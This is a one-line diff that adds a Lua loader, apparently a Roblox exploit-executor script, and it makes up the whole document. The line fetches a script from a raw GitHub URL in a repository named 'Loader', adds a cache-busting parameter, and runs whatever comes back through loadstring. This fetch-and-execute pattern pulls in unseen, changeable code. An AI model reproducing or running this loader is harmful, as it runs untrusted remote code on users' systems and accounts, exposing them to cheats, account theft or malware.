@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dam45383-netizen/Loader/main/main.lua?v="..tick()))()
